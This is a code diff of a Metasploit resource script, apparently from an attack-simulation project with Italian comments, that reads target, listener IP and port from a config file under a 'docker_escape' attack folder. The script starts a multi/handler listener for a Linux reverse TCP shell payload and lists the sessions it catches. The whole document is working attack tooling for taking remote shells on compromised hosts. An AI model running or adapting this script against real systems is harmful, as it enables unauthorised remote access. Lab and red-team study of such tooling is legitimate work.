@@ -1,16 +1,26 @@
-#TODO leggere parametri da config_rc.json
-set RHOSTS 192.168.42.21
-set LHOST 192.168.42.23
-set LPORT 2345
+<ruby>
+    require 'json'
 
-use exploit/multi/handler
-set payload linux/x86/shell_reverse_tcp
-exploit -j -z
+    config_file = 'data/attacker/custom_attacks/docker_escape/config_rc.json'
 
-# Aggiungere una pausa per verificare la creazione delle sessioni
-sleep 30
+    json_data = JSON.parse(File.read(config_file))
 
-# Controlla le sessioni attive (verifica manualmente o aggiungi un controllo nel modulo Ruby se necessario)
-sessions -l
+    #Vengono estratti i parametri dal json
+    rhosts = json_data['TARGET_IP']
+    lhost = json_data['LISTENING_IP']
+    lport = json_data['LPORT']
 
+    #Vengono configurati i parametri di attacco in Metasploit
+    run_single("set RHOSTS #{rhosts}")
+    run_single("set LHOST #{lhost}")
+    run_single("set LPORT #{lport}")
 
+    run_single("use exploit/multi/handler")
+    run_single("set payload linux/x86/shell_reverse_tcp")
+    run_single("exploit -j -z")
+
+    Rex.sleep(30)
+
+    run_single ("sessions -l")
+
+</ruby>
